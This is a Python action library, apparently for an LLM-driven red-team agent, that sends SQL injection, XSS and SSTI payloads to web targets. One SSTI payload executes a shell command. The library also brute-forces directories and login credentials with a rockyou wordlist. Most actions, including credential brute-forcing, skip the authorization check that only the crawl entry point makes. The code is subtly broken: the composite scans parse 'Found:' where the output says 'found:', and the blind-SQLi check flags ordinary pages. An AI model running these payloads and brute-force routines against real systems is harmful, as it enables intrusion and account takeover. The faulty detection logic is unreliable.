"""
src/action_library.py — patched with all fixes + composite actions.
"""
import logging
import os
import time
import urllib.parse
import re
from typing import List, Dict, Set, Optional

import requests
from bs4 import BeautifulSoup

from src import scope

logger = logging.getLogger(__name__)

USER_AGENT = "Nemesis-RedTeam-Agent/1.0 (authorized-security-test)"
DEFAULT_REQUEST_DELAY = 0.4
DEFAULT_MAX_REQUESTS = 300


class RequestBudgetExceeded(Exception):
    pass


class ActionLibrary:
    def __init__(self, request_delay: float = DEFAULT_REQUEST_DELAY,
                 max_requests: int = DEFAULT_MAX_REQUESTS):
        self.actions = {
            # Basic actions
            "send_http_request": self._send_http_request,
            "crawl_and_scan": self._crawl_and_scan,
            "test_sql_injection": self._test_sql_injection,
            "test_xss": self._test_xss,
            "test_ssti": self._test_ssti,
            "test_idor": self._test_idor,
            "test_privilege_escalation": self._test_privilege_escalation,
            "directory_bruteforce": self._directory_bruteforce,
            "check_headers": self._check_headers,
            "test_credential_bruteforce": self._test_credential_bruteforce,
            "analyze_source_for_secrets": self._analyze_source_for_secrets,
            "log_vulnerability": self._log_vulnerability,
            "check_robots_txt": self._check_robots_txt,
            # Composite actions (LLM‑friendly)
            "full_scan": self._full_scan,
            "scan_sqli_all_paths": self._scan_sqli_all_paths,
            "scan_xss_all_paths": self._scan_xss_all_paths,
            "scan_ssti_all_paths": self._scan_ssti_all_paths,
        }
        self.context = {}
        self.visited = set()
        self.findings = []
        self.base_url = None

        self.request_delay = request_delay
        self.max_requests = max_requests
        self.request_count = 0
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})

    def list_actions(self):
        return list(self.actions.keys())

    def execute(self, action_name: str, **kwargs):
        if action_name not in self.actions:
            raise ValueError(f"Unknown action: {action_name}")
        return self.actions[action_name](**kwargs)

    # ----- Centralized HTTP -----
    def _request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        if self.request_count >= self.max_requests:
            raise RequestBudgetExceeded(
                f"Hit the {self.max_requests}-request budget for this run."
            )
        kwargs.setdefault("timeout", 10)
        try:
            resp = self.session.request(method, url, **kwargs)
            self.request_count += 1
            time.sleep(self.request_delay)
            return resp
        except requests.RequestException as e:
            logger.debug(f"Request failed: {method} {url} -> {e}")
            self.request_count += 1
            time.sleep(self.request_delay)
            return None

    # ----- send_http_request (closes prompt/impl gap) -----
    def _send_http_request(self, url: str, method: str = "GET", data: Optional[Dict] = None) -> str:
        resp = self._request(method, url, data=data)
        if resp is None:
            return f"Request to {url} failed (connection error or timeout)."
        snippet = resp.text[:300].replace("\n", " ")
        return f"{method} {url} -> status {resp.status_code}, {len(resp.content)} bytes. Preview: {snippet}"

    # ----- Main crawl-and-scan (kept for compatibility) -----
    def _crawl_and_scan(self, base_url: str, max_depth: int = 3, max_pages: int = 50) -> str:
        if not scope.confirm_authorized(base_url):
            return f"Refused: '{base_url}' is not an authorized target."
        self.visited = set()
        self.findings = []
        self.base_url = base_url
        self.request_count = 0
        print(f"\n🕷 Starting deep crawl and scan on {base_url} ...")
        try:
            self._crawl(base_url, depth=0, max_depth=max_depth, max_pages=max_pages)
        except RequestBudgetExceeded as e:
            self.findings.append(f"[budget] {e}")
        report = f"## 🛡 Crawl & Scan Report\n\n"
        if self.findings:
            report += "### Vulnerabilities Found:\n"
            for f in self.findings:
                report += f"- {f}\n"
        else:
            report += "No vulnerabilities found.\n"
        report += f"\n📊 Total pages crawled: {len(self.visited)}\n"
        report += f"🌐 Total requests sent: {self.request_count}\n"
        report += f"🔍 Total findings: {len(self.findings)}\n"
        return report

    # ----- Recursive crawler (unchanged) -----
    def _crawl(self, url: str, depth: int, max_depth: int, max_pages: int):
        if depth > max_depth or len(self.visited) >= max_pages or url in self.visited:
            return
        self.visited.add(url)
        print(f"  🌐 Crawling: {url} (depth {depth})")
        resp = self._request("GET", url, allow_redirects=True)
        if resp is None:
            print(f"    ⚠ Failed to fetch {url}")
            return
        content_type = resp.headers.get("Content-Type", "")

        secrets = self._analyze_source_for_secrets(url, resp.text)
        if secrets and "No obvious" not in secrets:
            self.findings.append(f"[{url}] {secrets}")

        self._test_page(url, resp, method="GET")

        if "html" in content_type:
            soup = BeautifulSoup(resp.text, "lxml")
            for tag in soup.find_all(["a", "link", "script", "form"]):
                if tag.name == "a" and tag.get("href"):
                    link = tag["href"]
                elif tag.name in ["link", "script"] and tag.get("src"):
                    link = tag["src"]
                elif tag.name == "form" and tag.get("action"):
                    link = tag["action"]
                else:
                    continue
                full_url = urllib.parse.urljoin(url, link)
                if full_url.startswith(("http://", "https://")):
                    if urllib.parse.urlparse(full_url).netloc == urllib.parse.urlparse(self.base_url).netloc:
                        if full_url not in self.visited:
                            self._crawl(full_url, depth + 1, max_depth, max_pages)

            for form in soup.find_all("form"):
                action = form.get("action")
                if action:
                    form_url = urllib.parse.urljoin(url, action)
                    if form_url.startswith(("http://", "https://")):
                        self._test_page(form_url, resp, method="POST", form=form)

        # Quick directory fuzzing (default list) – kept for backward compatibility
        dirs = ["/admin", "/backup", "/config", "/test", "/api", "/dev", "/temp"]
        for d in dirs:
            test_url = urllib.parse.urljoin(url, d)
            if test_url in self.visited:
                continue
            r = self._request("GET", test_url)
            if r is None:
                continue
            if r.status_code == 200 and "login" not in r.text.lower():
                self.findings.append(f"[{test_url}] Discovered accessible directory (status 200)")
            elif r.status_code == 403:
                self.findings.append(f"[{test_url}] Directory protected (403)")

    # ----- Test a page (for crawl) -----
    def _test_page(self, url: str, response: requests.Response = None, method: str = "GET", form=None):
        if not response:
            response = self._request("GET", url)
            if response is None:
                return

        if "?" in url:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params.keys():
                sql_result = self._test_sql_injection(url, param, method="GET")
                if "SQL Injection detected" in sql_result:
                    self.findings.append(f"[{url}] {sql_result}")
                xss_result = self._test_xss(url, param, method="GET")
                if "XSS vulnerability detected" in xss_result:
                    self.findings.append(f"[{url}] {xss_result}")
                ssti_result = self._test_ssti(url, param, method="GET")
                if "SSTI vulnerability detected" in ssti_result:
                    self.findings.append(f"[{url}] {ssti_result}")

        if form:
            action = form.get("action")
            full_action = urllib.parse.urljoin(url, action)
            inputs = form.find_all("input")
            data = {}
            for inp in inputs:
                name = inp.get("name")
                if name:
                    data[name] = "test"
            for field in data.keys():
                sql_result = self._test_sql_injection(full_action, field, method="POST")
                if "SQL Injection detected" in sql_result:
                    self.findings.append(f"[{full_action}] {sql_result}")
                xss_result = self._test_xss(full_action, field, method="POST")
                if "XSS vulnerability detected" in xss_result:
                    self.findings.append(f"[{full_action}] {xss_result}")
                ssti_result = self._test_ssti(full_action, field, method="POST")
                if "SSTI vulnerability detected" in ssti_result:
                    self.findings.append(f"[{full_action}] {ssti_result}")

        if "?" in url:
            for param, values in urllib.parse.parse_qs(urllib.parse.urlparse(url).query).items():
                if values and values[0].isdigit():
                    base = url.replace(f"{param}={values[0]}", "")
                    for i in range(1, 6):
                        test_url = f"{base}{param}={i}"
                        r = self._request("GET", test_url)
                        if r and r.status_code == 200 and "login" not in r.text.lower() and len(r.text) > 100:
                            self.findings.append(f"[{test_url}] IDOR possible: accessed ID {i}")

        headers_result = self._check_headers(url)
        if "Missing security headers" in headers_result:
            self.findings.append(f"[{url}] {headers_result}")

        if "admin" in url or "dashboard" in url:
            priv_result = self._test_privilege_escalation(url)
            if "accessible admin" in priv_result:
                self.findings.append(f"[{url}] {priv_result}")

    # ----- VULNERABILITY TESTS -----

    def _test_sql_injection(self, url: str, parameter_to_test: str, method: str = "GET") -> str:
        payloads = [
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "admin'--", "') OR ('1'='1",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=1--", "1' AND 1=2--", "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "' OR SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--",
            "' AND 1=1 UNION SELECT 1,2,3,4,5--", "' AND 1=2 UNION SELECT 1,2,3,4,5--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--", "' UNION SELECT @@version--",
            "' UNION SELECT user()--", "' UNION SELECT database()--", "' UNION SELECT table_name FROM information_schema.tables--",
        ]
        findings = []
        for payload in payloads:
            test_params = {parameter_to_test: payload}
            if method.upper() == "GET":
                resp = self._request("GET", url, params=test_params)
            else:
                resp = self._request("POST", url, data=test_params)
            if resp is None:
                continue
            content = resp.text.lower()
            if any(kw in content for kw in ["sql", "syntax", "mysql", "oracle", "postgresql",
                                             "microsoft ole db", "error in your sql"]):
                findings.append(f"Payload: {payload} (status {resp.status_code})")
            elif resp.status_code == 200 and "error" not in content:
                findings.append(f"Potential blind SQLi with payload: {payload} (status {resp.status_code})")
        if findings:
            return f"SQL Injection detected on {parameter_to_test}:\n- " + "\n- ".join(findings)
        return f"No obvious SQL injection found on {parameter_to_test}."

    def _test_xss(self, url: str, parameter_to_test: str, method: str = "GET") -> str:
        payloads = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>", "javascript:alert(1)", "';alert(1);//",
            "\"><script>alert(1)</script>", "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
            "'';!--\"<XSS>=&{()}", "<IMG SRC=\"javascript:alert('XSS');\">",
            "<IMG SRC=javascript:alert('XSS')>", "<IMG SRC=\"jav	ascript:alert('XSS');\">"
        ]
        findings = []
        for payload in payloads:
            test_params = {parameter_to_test: payload}
            resp = self._request("GET" if method.upper() == "GET" else "POST", url,
                                  **({"params": test_params} if method.upper() == "GET" else {"data": test_params}))
            if resp is not None and payload in resp.text:
                findings.append(f"Reflected XSS with payload: {payload} (status {resp.status_code})")
        if findings:
            return f"XSS vulnerability detected on {parameter_to_test}:\n- " + "\n- ".join(findings)
        return f"No obvious XSS found on {parameter_to_test}."

    def _test_ssti(self, url: str, parameter_to_test: str, method: str = "GET") -> str:
        payloads = [
            "{{7*7}}", "${7*7}", "{{7*'7'}}", "<%= 7*7 %>",
            "{{config}}", "{{self.__class__.__mro__}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
        ]
        findings = []
        for payload in payloads:
            test_params = {parameter_to_test: payload}
            resp = self._request("GET" if method.upper() == "GET" else "POST", url,
                                  **({"params": test_params} if method.upper() == "GET" else {"data": test_params}))
            if resp is None:
                continue
            if "49" in resp.text or "7777777" in resp.text or "config" in resp.text:
                findings.append(f"SSTI with payload: {payload} (status {resp.status_code})")
        if findings:
            return f"SSTI vulnerability detected on {parameter_to_test}:\n- " + "\n- ".join(findings)
        return f"No obvious SSTI found on {parameter_to_test}."

    def _test_idor(self, base_url: str, resource_path: str, id_param: str, target_id: int = 1) -> str:
        findings = []
        for i in range(target_id, target_id + 5):
            test_url = f"{base_url}/{resource_path}?{id_param}={i}"
            resp = self._request("GET", test_url)
            if resp and resp.status_code == 200 and len(resp.text) > 100 and "login" not in resp.text.lower():
                findings.append(f"IDOR possible: accessed {test_url} with ID {i} (status 200)")
        if findings:
            return "IDOR vulnerability detected:\n- " + "\n- ".join(findings)
        return "No IDOR found."

    def _test_privilege_escalation(self, base_url: str) -> str:
        admin_paths = ["/admin", "/dashboard", "/panel", "/console", "/root", "/manage", "/administrator"]
        findings = []
        for path in admin_paths:
            test_url = base_url.rstrip("/") + path
            resp = self._request("GET", test_url)
            if resp and resp.status_code == 200 and "login" not in resp.text.lower():
                findings.append(f"Privilege escalation: accessible admin page at {test_url}")
        if findings:
            return "Privilege escalation opportunities found:\n- " + "\n- ".join(findings)
        return "No accessible admin pages found."

    # ----- DIRECTORY BRUTEFORCE (with wordlist file) -----
    def _directory_bruteforce(self, base_url: str,
                               wordlist_path: Optional[str] = None) -> str:
        """
        Brute‑force directories using a wordlist.
        If wordlist_path is provided and exists, use it; otherwise fallback to built-in list.
        """
        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                dirs = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            # Limit to 500 entries to keep it manageable
            dirs = dirs[:500]
        else:
            dirs = ["admin", "login", "test", "backup", "secret", "config", "api", "dev", "temp", "private"]

        findings = []
        for dir_name in dirs:
            test_url = base_url.rstrip("/") + "/" + dir_name
            resp = self._request("GET", test_url)
            if resp is None:
                continue
            if resp.status_code == 200:
                findings.append(f"Directory found: {test_url}")
            elif resp.status_code == 403:
                findings.append(f"Directory protected: {test_url} (403)")
            elif resp.status_code in [301, 302]:
                findings.append(f"Directory redirected: {test_url} -> {resp.headers.get('Location', '?')}")

        if findings:
            return "Directories discovered:\n- " + "\n- ".join(findings)
        return "No directories found."

    # ----- CHECK ROBOTS.TXT -----
    def _check_robots_txt(self, base_url: str) -> str:
        """Fetch /robots.txt and return its content and disallowed paths."""
        robots_url = base_url.rstrip("/") + "/robots.txt"
        resp = self._request("GET", robots_url)
        if resp is None:
            return "robots.txt not accessible (connection error)."
        if resp.status_code == 200:
            content = resp.text.strip()
            disallowed = []
            for line in content.splitlines():
                if line.lower().startswith("disallow:"):
                    path = line.split(":", 1)[1].strip()
                    if path:
                        disallowed.append(path)
            return (f"robots.txt found (status 200).\n"
                    f"Content:\n{content}\n\n"
                    f"Disallowed paths: {', '.join(disallowed) if disallowed else 'None'}")
        else:
            return f"robots.txt returned status {resp.status_code} (probably not present)."

    # ----- CHECK HEADERS -----
    def _check_headers(self, url: str) -> str:
        resp = self._request("GET", url)
        if resp is None:
            return "Could not fetch headers: request failed."
        missing = [h for h in ["X-Frame-Options", "X-XSS-Protection",
                                "Content-Security-Policy", "Strict-Transport-Security"]
                   if h not in resp.headers]
        if missing:
            return f"Missing security headers: {', '.join(missing)}"
        return "All recommended security headers are present."

    # ----- CREDENTIAL BRUTEFORCE (with rockyou default) -----
    def _test_credential_bruteforce(self, login_url: str, username_field: str, password_field: str,
                                     password_wordlist: Optional[str] = "/home/whxbi/wordlists/rockyou.txt",
                                     username_list: Optional[List[str]] = None) -> str:

        if password_wordlist and os.path.exists(password_wordlist):
            with open(password_wordlist, 'r', encoding='latin-1') as f:
                passes = [line.strip() for line in f if line.strip()]
            passes = passes[:200]   # limit for speed
        else:
            passes = ["password", "123456", "admin", "letmein", "qwerty", "password123"]

        if username_list is None:
            users = ["admin", "root", "guest", "user", "test"]
        else:
            users = username_list

        findings = []
        for user in users:
            for pwd in passes:
                data = {username_field: user, password_field: pwd}
                resp = self._request("POST", login_url, data=data)
                if resp is None:
                    continue
                if resp.status_code == 200 and "login" not in resp.text.lower() and "error" not in resp.text.lower():
                    findings.append(f"Credentials found: {user}:{pwd} (status {resp.status_code})")
                    break
            if findings:
                break

        if findings:
            return "Valid credentials found:\n- " + "\n- ".join(findings)
        return "No credentials found with the given wordlist or basic list."

    # ----- SOURCE SECRETS -----
    def _analyze_source_for_secrets(self, url: str, source: str) -> str:
        patterns = [
            (r'(?i)api[_-]?key\s*[:=]\s*["\']([^"\']+)["\']', 'API Key'),
            (r'(?i)secret\s*[:=]\s*["\']([^"\']+)["\']', 'Secret'),
            (r'(?i)password\s*[:=]\s*["\']([^"\']+)["\']', 'Password'),
            (r'(?i)token\s*[:=]\s*["\']([^"\']+)["\']', 'Token'),
            (r'(?i)private\s*[:=]\s*["\']([^"\']+)["\']', 'Private Key'),
            (r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', 'IP Address'),
            (r'https?://[^\s"\']+', 'URL'),
        ]
        findings = []
        for pattern, name in patterns:
            matches = re.findall(pattern, source)
            if matches:
                findings.append(f"{name}: {matches[0][:50]}")
        if findings:
            return "Potential secrets found: " + ", ".join(findings)
        return "No obvious secrets found."

    def _log_vulnerability(self, url: str, parameter_to_test: str, type: str, evidence: str) -> str:
        print(f"🔴 [VULNERABILITY] {type} on {url} with parameter {parameter_to_test}")
        print(f"   Evidence: {evidence}")
        return f"Logged: {type} at {url} on {parameter_to_test} - {evidence}"

    # --------------------------------------------------------------
    # COMPOSITE ACTIONS – these are LLM‑friendly shortcuts
    # --------------------------------------------------------------

    # ----- Full scan (uses the existing crawler) -----
    def _full_scan(self, base_url: str, max_depth: int = 3, max_pages: int = 50) -> str:
        """Run the full crawler and scan everything."""
        return self._crawl_and_scan(base_url, max_depth, max_pages)

    # ----- SQLi scan across all discovered paths -----
    def _scan_sqli_all_paths(self, base_url: str,
                              wordlist_path: Optional[str] = None,
                              params_to_test: Optional[List[str]] = None) -> str:
        """
        Fuzz paths with wordlist, test each found path for SQLi on common parameters.
        """
        if not wordlist_path:
            wordlist_path = "/home/whxbi/wordlists/seclists/Discovery/Web-Content/common.txt"
        if params_to_test is None:
            params_to_test = ["username", "password", "id", "email", "user", "login"]

        dir_result = self._directory_bruteforce(base_url, wordlist_path)
        if "No directories found" in dir_result:
            return dir_result

        # Parse discovered URLs from the result
        urls = []
        for line in dir_result.split("\n"):
            if "Found:" in line:
                url_part = line.split("Found: ")[1].strip()
                urls.append(url_part)

        findings = []
        for url in urls:
            for param in params_to_test:
                result = self._test_sql_injection(url, param, method="GET")
                if "SQL Injection detected" in result:
                    findings.append(f"[{url}] {result}")

        if findings:
            return "SQL Injection vulnerabilities on discovered paths:\n- " + "\n- ".join(findings)
        return "No SQLi found on any discovered path."

    # ----- XSS scan across all discovered paths -----
    def _scan_xss_all_paths(self, base_url: str,
                             wordlist_path: Optional[str] = None,
                             params_to_test: Optional[List[str]] = None) -> str:
        if not wordlist_path:
            wordlist_path = "/home/whxbi/wordlists/seclists/Discovery/Web-Content/common.txt"
        if params_to_test is None:
            params_to_test = ["q", "search", "name", "user", "id"]

        dir_result = self._directory_bruteforce(base_url, wordlist_path)
        if "No directories found" in dir_result:
            return dir_result

        urls = []
        for line in dir_result.split("\n"):
            if "Found:" in line:
                url_part = line.split("Found: ")[1].strip()
                urls.append(url_part)

        findings = []
        for url in urls:
            for param in params_to_test:
                result = self._test_xss(url, param, method="GET")
                if "XSS vulnerability detected" in result:
                    findings.append(f"[{url}] {result}")

        if findings:
            return "XSS vulnerabilities on discovered paths:\n- " + "\n- ".join(findings)
        return "No XSS found on any discovered path."

    # ----- SSTI scan across all discovered paths -----
    def _scan_ssti_all_paths(self, base_url: str,
                              wordlist_path: Optional[str] = None,
                              params_to_test: Optional[List[str]] = None) -> str:
        if not wordlist_path:
            wordlist_path = "/home/whxbi/wordlists/seclists/Discovery/Web-Content/common.txt"
        if params_to_test is None:
            params_to_test = ["name", "username", "param", "id"]

        dir_result = self._directory_bruteforce(base_url, wordlist_path)
        if "No directories found" in dir_result:
            return dir_result

        urls = []
        for line in dir_result.split("\n"):
            if "Found:" in line:
                url_part = line.split("Found: ")[1].strip()
                urls.append(url_part)

        findings = []
        for url in urls:
            for param in params_to_test:
                result = self._test_ssti(url, param, method="GET")
                if "SSTI vulnerability detected" in result:
                    findings.append(f"[{url}] {result}")

        if findings:
            return "SSTI vulnerabilities on discovered paths:\n- " + "\n- ".join(findings)
        return "No SSTI found on any discovered path."
